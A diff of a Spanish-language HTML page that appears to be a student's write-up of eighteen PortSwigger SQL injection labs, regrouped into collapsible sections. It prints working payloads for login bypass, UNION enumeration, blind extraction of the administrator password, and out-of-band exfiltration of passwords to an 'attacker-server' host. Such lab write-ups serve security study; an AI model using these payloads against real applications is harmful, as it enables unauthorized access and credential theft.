@@ -29,13 +29,11 @@
 
 					<!-- Content -->
 					<article id="content">
-
 						<header class="major">
 							<h2>SQL INJECTION (PORTSWIGGER)</h2>
 							<p>ROADMAP</p>
 							
 							<hr/>
-							
 						</header>
 
 						<p>
@@ -53,470 +51,474 @@
 						</p>
 
 						<hr>
-
-						<h3>Lab 1 – SQL Injection en cláusula WHERE permitiendo recuperar datos ocultos</h3>
 						
-						<center>
-						<img src="images/sql/1_1.png" alt="Lab 1.1 SQL Injection Hidden Data" width="800">
-						<img src="images/sql/1_2.png" alt="Lab 1.2 SQL Injection Hidden Data" width="800">
-						</center>
+						<strong>APPRENTICE:</strong>
+						<details class="lab">
+							<summary>Lab 1 – SQL Injection en cláusula WHERE permitiendo recuperar datos ocultos</summary>
+							
+							<hr>
+							
+							<center>
+							<img src="images/sql/1_1.png" width="800">
+							<img src="images/sql/1_2.png" width="800">
+							</center>
 
-						<p>
-						En este laboratorio se explota una vulnerabilidad SQL Injection presente en 
-						el parámetro <strong>category</strong>. La aplicación construye la consulta SQL 
-						directamente con la entrada del usuario, permitiendo modificar la cláusula 
-						WHERE para mostrar registros que normalmente se encuentran ocultos.
-						</p>
+							<p>
+							En este laboratorio se explota una vulnerabilidad SQL Injection presente en 
+							el parámetro <strong>category</strong>.
+							</p>
 
-						<p><strong>Evidencia:</strong></p>
+							<p><strong>Evidencia:</strong><br>/filter?category=Gifts'+OR+1=1--</p>
 
-						<pre>
-						/filter?category=Gifts'+OR+1=1--
-						</pre>
+							<p>
+							El payload altera la condición lógica de la consulta devolviendo todos los registros.
+							</p>
+							
+							<hr>
+						</details>
 
-						<p>
-						El payload altera la condición lógica de la consulta, devolviendo todos los 
-						registros de la tabla de productos.
-						</p>
+						<details>
+							<summary>Lab 2 – SQL Injection permitiendo bypass de autenticación</summary>
+							
+							<hr>
+							
+							<center>
+							<img src="images/sql/2_1.png" alt="Lab 2.1 SQL Injection Login Bypass" width="800">
+							<img src="images/sql/2_2.png" alt="Lab 2.2 SQL Injection Login Bypass" width="800">
+							<img src="images/sql/2_3.png" alt="Lab 2.3 SQL Injection Login Bypass" width="800">
+							</center>
 
-						<hr>
+							<p>
+							El formulario de inicio de sesión es vulnerable a SQL Injection debido a que 
+							las credenciales introducidas por el usuario se insertan directamente en la 
+							consulta SQL de autenticación. Esto permite modificar la lógica de validación 
+							para acceder sin conocer la contraseña real.
+							</p>
 
-						<h3>Lab 2 – SQL Injection permitiendo bypass de autenticación</h3>
+							<p><strong>Evidencia:</strong>
+								<div class="feature">
+									<strong>Username:</strong> administrator'-- , <strong>Password:</strong> admin1234
+								</div>
+							</p>
 
-						<center>
-						<img src="images/sql/2_1.png" alt="Lab 2.1 SQL Injection Login Bypass" width="800">
-						<img src="images/sql/2_2.png" alt="Lab 2.2 SQL Injection Login Bypass" width="800">
-						<img src="images/sql/2_3.png" alt="Lab 2.3 SQL Injection Login Bypass" width="800">
-						</center>
-
-						<p>
-						El formulario de inicio de sesión es vulnerable a SQL Injection debido a que 
-						las credenciales introducidas por el usuario se insertan directamente en la 
-						consulta SQL de autenticación. Esto permite modificar la lógica de validación 
-						para acceder sin conocer la contraseña real.
-						</p>
-
-						<p><strong>Evidencia:</strong></p>
-
-						<pre>
-						Username: administrator'--
-						Password: admin1234
-						</pre>
-
-						<p>
-						El comentario SQL (<strong>--</strong>) ignora la parte restante de la consulta, 
-						permitiendo iniciar sesión como administrador.
-						</p>
-
-						<hr>
-
-						<h3>Lab 3 – SQL Injection para identificar tipo y versión de base de datos (Oracle)</h3>
-						
-						<center>
-						<img src="images/sql/3_1.png" alt="Lab 3.1 SQL Injection Database Version Oracle" width="800">
-						<img src="images/sql/3_2.png" alt="Lab 3.2 SQL Injection Database Version Oracle" width="800">
-						<img src="images/sql/3_3.png" alt="Lab 3.3 SQL Injection Database Version Oracle" width="800">
-						</center>
-
-						<p>
-						En este laboratorio se utiliza un ataque UNION para obtener información sobre 
-						el sistema gestor de base de datos. Oracle requiere consultas específicas para 
-						recuperar la versión del servidor.
-						</p>
-
-						<p><strong>Evidencia:</strong></p>
-
-						<pre>
-						'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
-						</pre>
-
-						<p>
-						La consulta permite recuperar información sobre la versión de Oracle utilizada 
-						por la aplicación vulnerable.
-						</p>
-
-						<hr>
-
-						<h3>Lab 4 – SQL Injection para identificar tipo y versión de base de datos (MySQL y MSSQL)</h3>
-						
-						<center>
-						<img src="images/sql/4_1.png" alt="Lab 4.1 SQL Injection Database Version MySQL" width="800">
-						<img src="images/sql/4_2.png" alt="Lab 4.2 SQL Injection Database Version MySQL" width="800">
-						<img src="images/sql/4_3.png" alt="Lab 4.3 SQL Injection Database Version MySQL" width="800">
-						</center>
-
-						<p>
-						Este laboratorio demuestra cómo identificar el motor de base de datos utilizado 
-						por una aplicación mediante consultas específicas soportadas por MySQL y 
-						Microsoft SQL Server.
-						</p>
-
-						<p><strong>Evidencia:</strong></p>
-
-						<pre>
-						'+UNION+SELECT+@@version,+NULL#
-						</pre>
-
-						<p>
-						El payload permite recuperar la versión del servidor de base de datos desde 
-						la respuesta de la aplicación.
-						</p>
-
-						<hr>
-
-						<h3>Lab 5 – SQL Injection listando contenido de la base de datos</h3>
-
-						<center>
-						<img src="images/sql/5_1.png" alt="Lab 5.1 SQL Injection Database Enumeration" width="800">
-						<img src="images/sql/5_2.png" alt="Lab 5.2 SQL Injection Database Enumeration" width="800">
-						<img src="images/sql/5_3.png" alt="Lab 5.3 SQL Injection Database Enumeration" width="800">
-						</center>
-
-						<p>
-						Se explota SQL Injection para enumerar las tablas existentes en la base de 
-						datos utilizando la tabla del sistema <strong>information_schema</strong>. 
-						Esto permite identificar estructuras internas de la base de datos.
-						</p>
-
-						<p><strong>Evidencia:</strong></p>
-
-						<pre>
-						'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--
-						</pre>
-
-						<p>
-						El resultado muestra las tablas disponibles, incluyendo la tabla de usuarios.
-						</p>
+							<p>
+							El comentario SQL (<strong>--</strong>) ignora la parte restante de la consulta, 
+							permitiendo iniciar sesión como administrador.
+							</p>
+						</details>
 						
 						<hr>
+						
+						<strong>PRACTITIONER:</strong>
+						<details>
+							<summary>Lab 3 – SQL Injection para identificar tipo y versión de base de datos (Oracle)</summary>
+							
+							<hr>
+							
+							<center>
+							<img src="images/sql/3_1.png" alt="Lab 3.1 SQL Injection Database Version Oracle" width="800">
+							<img src="images/sql/3_2.png" alt="Lab 3.2 SQL Injection Database Version Oracle" width="800">
+							<img src="images/sql/3_3.png" alt="Lab 3.3 SQL Injection Database Version Oracle" width="800">
+							</center>
 
-						<h3>Lab 6 – SQL Injection listando contenido de la base de datos en Oracle</h3>
+							<p>
+							En este laboratorio se utiliza un ataque UNION para obtener información sobre 
+							el sistema gestor de base de datos. Oracle requiere consultas específicas para 
+							recuperar la versión del servidor.
+							</p>
 
-						<center>
-						<img src="images/sql/6_1.png" alt="Lab 6.1 SQL Injection Oracle Enumeration" width="800">
-						<img src="images/sql/6_2.png" alt="Lab 6.2 SQL Injection Oracle Enumeration" width="800">
-						<img src="images/sql/6_3.png" alt="Lab 6.3 SQL Injection Oracle Enumeration" width="800">
-						</center>
+							<p><strong>Evidencia:</strong><br>'+UNION+SELECT+BANNER,+NULL+FROM+v$version--</p>
 
-						<p>
-						En este laboratorio se utiliza SQL Injection para enumerar las tablas disponibles
-						en una base de datos Oracle. A diferencia de otros motores, Oracle utiliza vistas
-						del sistema específicas como <strong>all_tables</strong> para consultar metadatos.
-						</p>
+							<p>
+							La consulta permite recuperar información sobre la versión de Oracle utilizada 
+							por la aplicación vulnerable.
+							</p>
+							
+							<hr>
+						</details>
 
-						<p><strong>Evidencia:</strong></p>
+						<details>
+							<summary>Lab 4 – SQL Injection para identificar tipo y versión de base de datos (MySQL y MSSQL)</summary>
+							
+							<hr>
+							
+							<center>
+							<img src="images/sql/4_1.png" alt="Lab 4.1 SQL Injection Database Version MySQL" width="800">
+							<img src="images/sql/4_2.png" alt="Lab 4.2 SQL Injection Database Version MySQL" width="800">
+							<img src="images/sql/4_3.png" alt="Lab 4.3 SQL Injection Database Version MySQL" width="800">
+							</center>
 
-						<pre>
-						' UNION SELECT table_name,NULL FROM all_tables--
-						</pre>
+							<p>
+							Este laboratorio demuestra cómo identificar el motor de base de datos utilizado 
+							por una aplicación mediante consultas específicas soportadas por MySQL y 
+							Microsoft SQL Server.
+							</p>
 
-						<p>
-						La consulta permite identificar las tablas existentes, incluyendo aquellas que
-						contienen credenciales de usuarios.
-						</p>
+							<p><strong>Evidencia:</strong><br>'+UNION+SELECT+@@version,+NULL#</p>
 
+							<p>
+							El payload permite recuperar la versión del servidor de base de datos desde 
+							la respuesta de la aplicación.
+							</p>
+							
+							<hr>
+						</details>
+
+						<details class="lab">
+							<summary>Lab 5 – SQL Injection listando contenido de la base de datos</summary>
+							
+							<hr>
+							
+							<center>
+							<img src="images/sql/5_1.png" width="800">
+							<img src="images/sql/5_2.png" width="800">
+							<img src="images/sql/5_3.png" width="800">
+							</center>
+
+							<p>
+							Se explota SQL Injection para enumerar las tablas existentes en la base de datos utilizando la tabla del sistema <strong>information_schema</strong>.
+							</p>
+
+							<p><strong>Evidencia:</strong><br>'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--</p>
+
+							<p>
+							El resultado muestra las tablas disponibles, incluyendo la tabla de usuarios.
+							</p>
+							
+							<hr>
+						</details>
+
+						<details class="lab">
+							<summary>Lab 6 – SQL Injection listando contenido de la base de datos en Oracle</summary>
+							
+							<hr>
+
+							<center>
+							<img src="images/sql/6_1.png" width="800">
+							<img src="images/sql/6_2.png" width="800">
+							<img src="images/sql/6_3.png" width="800">
+							</center>
+
+							<p>
+							Se utiliza SQL Injection para enumerar tablas en una base de datos Oracle utilizando vistas del sistema como <strong>all_tables</strong>.
+							</p>
+
+							<p><strong>Evidencia:</strong><br>' UNION SELECT table_name,NULL FROM all_tables--</p>
+
+							<p>
+							La consulta permite identificar tablas existentes que pueden contener información sensible.
+							</p>
+							
+							<hr>
+						</details>
+
+						<details class="lab">
+							<summary>Lab 7 – SQL Injection UNION determinando el número de columnas</summary>
+							
+							<hr>
+
+							<center>
+							<img src="images/sql/7_1.png" width="800">
+							<img src="images/sql/7_2.png" width="800">
+							<img src="images/sql/7_3.png" width="800">
+							</center>
+
+							<p>
+							Se determina el número de columnas necesarias para un ataque UNION SELECT probando diferentes cantidades de valores NULL.
+							</p>
+
+							<p><strong>Evidencia:</strong><br>'+UNION+SELECT+NULL,NULL--</p>
+
+							<p>
+							Cuando el número coincide con el de la consulta original, el servidor procesa correctamente la solicitud.
+							</p>
+							
+							<hr>
+						</details>
+
+						<details class="lab">
+							<summary>Lab 8 – SQL Injection encontrando una columna que acepte texto</summary>
+							
+							<hr>
+
+							<center>
+							<img src="images/sql/8_1.png" width="800">
+							<img src="images/sql/8_2.png" width="800">
+							<img src="images/sql/8_3.png" width="800">
+							</center>
+
+							<p>
+							Después de identificar el número de columnas, se busca cuál permite datos de tipo texto para mostrar resultados.
+							</p>
+
+							<p><strong>Evidencia:</strong><br>'+UNION+SELECT+'abcdef',NULL,NULL--</p>
+
+							<p>
+							La respuesta permite identificar qué columna muestra datos textuales.
+							</p>
+							
+							<hr>
+						</details>
+
+						<details class="lab">
+							<summary>Lab 9 – SQL Injection extrayendo datos de otras tablas</summary>
+							
+							<hr>
+
+							<center>
+							<img src="images/sql/9_1.png" width="800">
+							<img src="images/sql/9_2.png" width="800">
+							<img src="images/sql/9_3.png" width="800">
+							</center>
+
+							<p>
+							Una vez identificadas las columnas correctas, se usa UNION SELECT para consultar otras tablas del sistema.
+							</p>
+
+							<p><strong>Evidencia:</strong><br>'+UNION+SELECT+username,+password+FROM+users--</p>
+
+							<p>
+							El resultado muestra credenciales almacenadas en la base de datos.
+							</p>
+							
+							<hr>
+						</details>
+
+						<details class="lab">
+							<summary>Lab 10 – SQL Injection recuperando múltiples valores en una sola columna</summary>
+							
+							<hr>
+
+							<center>
+							<img src="images/sql/10_1.png" width="800">
+							<img src="images/sql/10_2.png" width="800">
+							<img src="images/sql/10_3.png" width="800">
+							</center>
+
+							<p>
+							Cuando solo una columna es visible en la respuesta, se pueden concatenar múltiples valores para extraer información.
+							</p>
+
+							<p><strong>Evidencia:</strong><br>'+UNION+SELECT+NULL,username||'~'||password+FROM+users--</p>
+
+							<p>
+							El operador de concatenación permite combinar múltiples campos.
+							</p>
+							
+							<hr>
+						</details>
+
+						<details class="lab">
+							<summary>Lab 11 – Blind SQL Injection con respuestas condicionales</summary>
+							
+							<hr>
+
+							<center>
+							<img src="images/sql/11_1.png" width="800">
+							<img src="images/sql/11_2.png" width="800">
+							<img src="images/sql/11_3.png" width="800">
+							</center>
+
+							<p>
+							La aplicación no muestra resultados SQL directamente, por lo que se utilizan condiciones booleanas para observar cambios en la respuesta.
+							</p>
+
+							<p><strong>Evidencia:</strong><br>TrackingId=xyz' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§'
+							
+								<div class="feature">
+									La contraseña obtenida para este laboratorio fue: <strong>hs79w9y8vd8mo2hshr2f</strong>
+								</div>
+							</p>
+							
+							<p>
+							Si la condición es verdadera, la página responde normalmente.
+							</p>
+							
+							<hr>
+						</details>
+
+						<details class="lab">
+							<summary>Lab 12 – Blind SQL Injection con errores condicionales</summary>
+							
+							<hr>
+
+							<center>
+							<img src="images/sql/12_1.png" width="800">
+							<img src="images/sql/12_2.png" width="800">
+							<img src="images/sql/12_3.png" width="800">
+							</center>
+
+							<p>
+							Se generan errores intencionales para inferir información sobre la base de datos.
+							</p>
+
+							<p><strong>Evidencia:</strong>
+								<br>TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,§1§,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+								<div class="feature">
+									La contraseña obtenida para este laboratorio fue: <strong>d7pb1wki8nntlgcmwrb4</strong>
+								</div>
+							</p>
+							
+							<hr>
+						</details>
+
+						<details class="lab">
+							<summary>Lab 13 – SQL Injection basada en errores visibles</summary>
+							
+							<hr>
+
+							<center>
+							<img src="images/sql/13_1.png" width="800">
+							<img src="images/sql/13_2.png" width="800">
+							<img src="images/sql/13_3.png" width="800">
+							</center>
+
+							<p>
+							Algunas aplicaciones muestran errores SQL directamente al usuario.
+							</p>
+
+							<p><strong>Evidencia:</strong><br>TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--</p>
+							
+							<hr>
+						</details>
+
+						<details class="lab">
+							<summary>Lab 14 – Blind SQL Injection con retrasos de tiempo</summary>
+							
+							<hr>
+
+							<center>
+							<img src="images/sql/14_1.png" width="800">
+							<img src="images/sql/14_2.png" width="800">
+							<img src="images/sql/14_3.png" width="800">
+							</center>
+
+							<p>
+							Se introduce un retraso cuando una condición es verdadera.
+							</p>
+
+							<p><strong>Evidencia:</strong> TrackingId=x'||pg_sleep(10)--</p>
+							
+							<hr>
+						</details>
+
+						<details class="lab">
+							<summary>Lab 15 – Blind SQL Injection con retrasos y extracción de información</summary>
+							
+							<hr>
+
+							<center>
+							<img src="images/sql/15_1.png" width="800">
+							<img src="images/sql/15_2.png" width="800">
+							<img src="images/sql/15_3.png" width="800">
+							</center>
+
+							<p>
+							Permite extraer información carácter por carácter utilizando retrasos en la respuesta.
+							</p>
+
+							<p><strong>Evidencia:</strong>
+								<br>'%3BSELECT CASE WHEN (username='administrator' AND SUBSTRING(password,§1§,1)='§a§') 
+								THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
+								<div class="feature">
+									La contraseña obtenida para este laboratorio fue: <strong>6udi36a8k88ioc9f9eda</strong>
+								</div>
+							</p>
+							
+							<hr>
+						</details>
+
+						<details class="lab">
+							<summary>Lab 16 – Blind SQL Injection con interacción Out-of-Band</summary>
+							
+							<hr>
+
+							<p>
+							Se utilizan servidores externos para confirmar la ejecución de consultas SQL.
+							</p>
+
+							<p><strong>Evidencia:</strong><br>'; exec master..xp_dirtree '//attacker-server/test'--</p>
+
+							<p>
+							El servidor intenta conectarse al servidor controlado por el atacante.
+							</p>
+							
+							<div>
+								Nota: Este laboratorio no pudo ser desarrollado completamente debido a que requiere
+								el uso de <strong>Burp Collaborator</strong>. Esta funcionalidad no se encuentra disponible
+								en <strong>Burp Suite Community Edition</strong>, por lo que no fue posible verificar la
+								interacción Out-of-Band con un servidor externo.
+							</div>
+							
+							<hr>
+						</details>
+
+						<details class="lab">
+							<summary>Lab 17 – Blind SQL Injection con exfiltración Out-of-Band</summary>
+							
+							<hr>
+
+							<p>
+							Permite enviar datos directamente a un servidor externo controlado por el atacante.
+							</p>
+
+							<p><strong>Evidencia:</strong><br>'|| UTL_HTTP.REQUEST('http://attacker-server/'||password)--</p>
+
+							<p>
+							Los datos sensibles se envían fuera del sistema vulnerable.
+							</p>
+							
+							<div>
+								Nota: Este laboratorio no pudo ser desarrollado completamente debido a que requiere
+								el uso de <strong>Burp Collaborator</strong>. Esta funcionalidad no se encuentra disponible
+								en <strong>Burp Suite Community Edition</strong>, por lo que no fue posible verificar la
+								interacción Out-of-Band con un servidor externo.
+							</div>
+							
+							<hr>
+						</details>
+
+						<details class="lab">
+							<summary>Lab 18 – SQL Injection con bypass de filtros mediante codificación XML</summary>
+							
+							<hr>
+
+							<center>
+							<img src="images/sql/18_1.png" width="800">
+							<img src="images/sql/18_2.png" width="800">
+							<img src="images/sql/18_3.png" width="800">
+							</center>
+
+							<p>
+							Algunas aplicaciones bloquean caracteres peligrosos, pero es posible evadir estos filtros mediante codificación.
+							</p>
+
+							<p><strong>Evidencia:</strong><br>1 UNION SELECT username || '~' || password FROM users</p>
+
+							<p>
+							La codificación permite evadir filtros de seguridad.
+							</p>
+							
+							<div>
+								Nota: Para este laboratorio, se utilizó una herramienta externa llamada <strong>Cyberchef</strong> para poder convertir
+								el comando en valores hexadecimales para llevar a cabo la vulnerabilidad.
+							</div>
+						</details>
+						
 						<hr>
-
-						<h3>Lab 7 – SQL Injection UNION determinando el número de columnas</h3>
-
-						<center>
-						<img src="images/sql/7_1.png" alt="Lab 7.1 SQL Injection Column Count" width="800">
-						<img src="images/sql/7_2.png" alt="Lab 7.2 SQL Injection Column Count" width="800">
-						<img src="images/sql/7_3.png" alt="Lab 7.3 SQL Injection Column Count" width="800">
-						</center>
-
-						<p>
-						Este laboratorio demuestra cómo determinar el número de columnas de una consulta
-						SQL para poder ejecutar correctamente un ataque <strong>UNION SELECT</strong>.
-						Esto se realiza probando diferentes cantidades de valores NULL hasta evitar errores.
-						</p>
-
-						<p><strong>Evidencia:</strong></p>
-
-						<pre>
-						'+UNION+SELECT+NULL,NULL--
-						</pre>
-
-						<p>
-						Cuando el número de columnas coincide con el de la consulta original,
-						el servidor procesa correctamente la solicitud.
-						</p>
-
-						<hr>
-
-						<h3>Lab 8 – SQL Injection encontrando una columna que acepte texto</h3>
-
-						<center>
-						<img src="images/sql/8_1.png" alt="Lab 8.1 SQL Injection Text Column" width="800">
-						<img src="images/sql/8_2.png" alt="Lab 8.2 SQL Injection Text Column" width="800">
-						<img src="images/sql/8_3.png" alt="Lab 8.3 SQL Injection Text Column" width="800">
-						</center>
-
-						<p>
-						Después de determinar el número de columnas, es necesario identificar cuál
-						de ellas permite insertar datos de tipo texto. Esto es fundamental para
-						mostrar información extraída de otras tablas.
-						</p>
-
-						<p><strong>Evidencia:</strong></p>
-
-						<pre>
-						'+UNION+SELECT+'abcdef',NULL,NULL--
-						</pre>
-
-						<p>
-						La respuesta de la aplicación revela qué columna puede mostrar contenido textual.
-						</p>
-
-						<hr>
-
-						<h3>Lab 9 – SQL Injection extrayendo datos de otras tablas</h3>
-
-						<center>
-						<img src="images/sql/9_1.png" alt="Lab 9.1 SQL Injection Extract Data" width="800">
-						<img src="images/sql/9_2.png" alt="Lab 9.2 SQL Injection Extract Data" width="800">
-						<img src="images/sql/9_3.png" alt="Lab 9.3 SQL Injection Extract Data" width="800">
-						</center>
-
-						<p>
-						Una vez identificadas las columnas correctas, se utiliza UNION SELECT para
-						consultar directamente otras tablas del sistema, como la tabla de usuarios.
-						</p>
-
-						<p><strong>Evidencia:</strong></p>
-
-						<pre>
-						'+UNION+SELECT+username,+password+FROM+users--
-						</pre>
-
-						<p>
-						El resultado muestra credenciales almacenadas en la base de datos.
-						</p>
-
-						<hr>
-
-						<h3>Lab 10 – SQL Injection recuperando múltiples valores en una sola columna</h3>
-
-						<center>
-						<img src="images/sql/10_1.png" alt="Lab 10.1 SQL Injection Concatenation" width="800">
-						<img src="images/sql/10_2.png" alt="Lab 10.2 SQL Injection Concatenation" width="800">
-						<img src="images/sql/10_3.png" alt="Lab 10.3 SQL Injection Concatenation" width="800">
-						</center>
-
-						<p>
-						Algunas aplicaciones solo muestran una columna en la respuesta. En estos casos
-						se pueden concatenar múltiples valores en una sola cadena para extraer información
-						completa.
-						</p>
-
-						<p><strong>Evidencia:</strong></p>
-
-						<pre>
-						'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
-						</pre>
-
-						<p>
-						El operador de concatenación permite combinar múltiples campos en una sola salida.
-						</p>
-
-						<hr>
-
-						<h3>Lab 11 – Blind SQL Injection con respuestas condicionales</h3>
-
-						<center>
-						<img src="images/sql/11_1.png" alt="Lab 11.1 Blind SQL Injection Conditional Response" width="800">
-						<img src="images/sql/11_2.png" alt="Lab 11.2 Blind SQL Injection Conditional Response" width="800">
-						<img src="images/sql/11_3.png" alt="Lab 11.3 Blind SQL Injection Conditional Response" width="800">
-						</center>
-
-						<p>
-						En este laboratorio la aplicación no muestra directamente los resultados de la
-						consulta SQL. En su lugar, se utilizan condiciones booleanas para observar
-						diferencias en la respuesta del servidor.
-						</p>
-
-						<p><strong>Evidencia:</strong></p>
-
-						<pre>
-						TrackingId=xyz' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§'
-						</pre>
-
-						<p>
-						Si la condición es verdadera, la página responde normalmente; si es falsa,
-						la respuesta cambia o no devuelve resultados.
-						</p>
-
-						<hr>
-
-						<h3>Lab 12 – Blind SQL Injection con errores condicionales</h3>
-
-						<center>
-						<img src="images/sql/12_1.png" alt="Lab 12.1 Blind SQL Injection Errors" width="800">
-						<img src="images/sql/12_2.png" alt="Lab 12.2 Blind SQL Injection Errors" width="800">
-						<img src="images/sql/12_3.png" alt="Lab 12.3 Blind SQL Injection Errors" width="800">
-						</center>
-
-						<p>
-						Este laboratorio utiliza errores generados intencionalmente para inferir
-						información sobre la base de datos cuando las respuestas directas no están
-						disponibles.
-						</p>
-
-						<p><strong>Evidencia:</strong></p>
-
-						<pre>
-						TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,§1§,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
-						</pre>
-
-						<p>
-						Si la condición se cumple, se genera un error que revela información útil
-						para el atacante.
-						</p>
-
-						<hr>
-
-						<h3>Lab 13 – SQL Injection basada en errores visibles</h3>
-
-						<center>
-						<img src="images/sql/13_1.png" alt="Lab 13.1 Error Based SQL Injection" width="800">
-						<img src="images/sql/13_2.png" alt="Lab 13.2 Error Based SQL Injection" width="800">
-						<img src="images/sql/13_3.png" alt="Lab 13.3 Error Based SQL Injection" width="800">
-						</center>
-
-						<p>
-						Algunas aplicaciones muestran mensajes de error SQL directamente al usuario.
-						Estos mensajes pueden revelar información sobre la estructura de la base
-						de datos o sobre la consulta ejecutada.
-						</p>
-
-						<p><strong>Evidencia:</strong></p>
-
-						<pre>
-						TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
-						</pre>
-
-						<p>
-						El error generado puede exponer datos internos de la base de datos.
-						</p>
-
-						<hr>
-
-						<h3>Lab 14 – Blind SQL Injection con retrasos de tiempo</h3>
-
-						<center>
-						<img src="images/sql/14_1.png" alt="Lab 14.1 Time Based SQL Injection" width="800">
-						<img src="images/sql/14_2.png" alt="Lab 14.2 Time Based SQL Injection" width="800">
-						<img src="images/sql/14_3.png" alt="Lab 14.3 Time Based SQL Injection" width="800">
-						</center>
-
-						<p>
-						En ataques basados en tiempo, el servidor introduce un retraso cuando una
-						condición específica es verdadera. Esto permite inferir información incluso
-						cuando no hay salida visible en la aplicación.
-						</p>
-
-						<p><strong>Evidencia:</strong></p>
-
-						<pre>
-						TrackingId=x'||pg_sleep(10)--
-						</pre>
-
-						<p>
-						El retraso de cinco segundos confirma que la condición evaluada es verdadera.
-						</p>
-
-						<hr>
-
-						<h3>Lab 15 – Blind SQL Injection con retrasos y extracción de información</h3>
-
-						<center>
-						<img src="images/sql/15_1.png" alt="Lab 15.1 Time Based Data Extraction" width="800">
-						<img src="images/sql/15_2.png" alt="Lab 15.2 Time Based Data Extraction" width="800">
-						<img src="images/sql/15_3.png" alt="Lab 15.3 Time Based Data Extraction" width="800">
-						</center>
-
-						<p>
-						Esta técnica permite extraer información carácter por carácter evaluando
-						condiciones que provocan retrasos en la respuesta del servidor.
-						</p>
-
-						<p><strong>Evidencia:</strong></p>
-
-						<pre>
-						TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,§1§,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
-						</pre>
-
-						<p>
-						Mediante múltiples solicitudes se puede reconstruir el valor completo del dato.
-						</p>
-
-						<hr>
-
-						<h3>Lab 16 – Blind SQL Injection con interacción Out-of-Band</h3>
-
-						<p>
-						Cuando la aplicación no devuelve resultados ni tiempos diferenciados,
-						puede utilizarse interacción con servidores externos para confirmar la
-						ejecución de consultas SQL.
-						</p>
-
-						<p><strong>Evidencia:</strong></p>
-
-						<pre>
-						'; exec master..xp_dirtree '//attacker-server/test'--
-						</pre>
-
-						<p>
-						El servidor vulnerable intenta conectarse al servidor externo controlado
-						por el atacante.
-						</p>
-
-						<hr>
-
-						<h3>Lab 17 – Blind SQL Injection con exfiltración Out-of-Band</h3>
-
-						<p>
-						Este laboratorio demuestra cómo extraer datos directamente hacia un servidor
-						externo utilizando consultas SQL que generan solicitudes HTTP o DNS.
-						</p>
-
-						<p><strong>Evidencia:</strong></p>
-
-						<pre>
-						'|| UTL_HTTP.REQUEST('http://attacker-server/'||password)--
-						</pre>
-
-						<p>
-						Los datos sensibles son enviados fuera del sistema vulnerable.
-						</p>
-
-						<hr>
-
-						<h3>Lab 18 – SQL Injection con bypass de filtros mediante codificación XML</h3>
-
-						<center>
-						<img src="images/sql/18_1.png" alt="Lab 18.1 SQL Injection XML Encoding" width="800">
-						<img src="images/sql/18_2.png" alt="Lab 18.2 SQL Injection XML Encoding" width="800">
-						<img src="images/sql/18_3.png" alt="Lab 18.3 SQL Injection XML Encoding" width="800">
-						</center>
-
-						<p>
-						Algunas aplicaciones implementan filtros que bloquean caracteres peligrosos.
-						Sin embargo, es posible evadir estos filtros utilizando codificación XML
-						u otros métodos de transformación de caracteres.
-						</p>
-
-						<p><strong>Evidencia:</strong></p>
-
-						<pre>
-						1 UNION SELECT username || '~' || password FROM users
-						</pre>
-
-						<p>
-						El uso de codificación permite que el payload pase los filtros de seguridad
-						pero sea interpretado correctamente por el servidor SQL.
-						</p>
-
+						
+						<ul class="actions">
+							<li>
+								<a href="docs/180370-act01.pdf" class="button" download>
+									Descargar PDF
+								</a>
+							</li>
+							<li>
+								<a href="index.html" class="button">
+									Regresar al inicio
+								</a>
+							</li>
+						</ul>
 					</article>
 				</div>
 			</div>
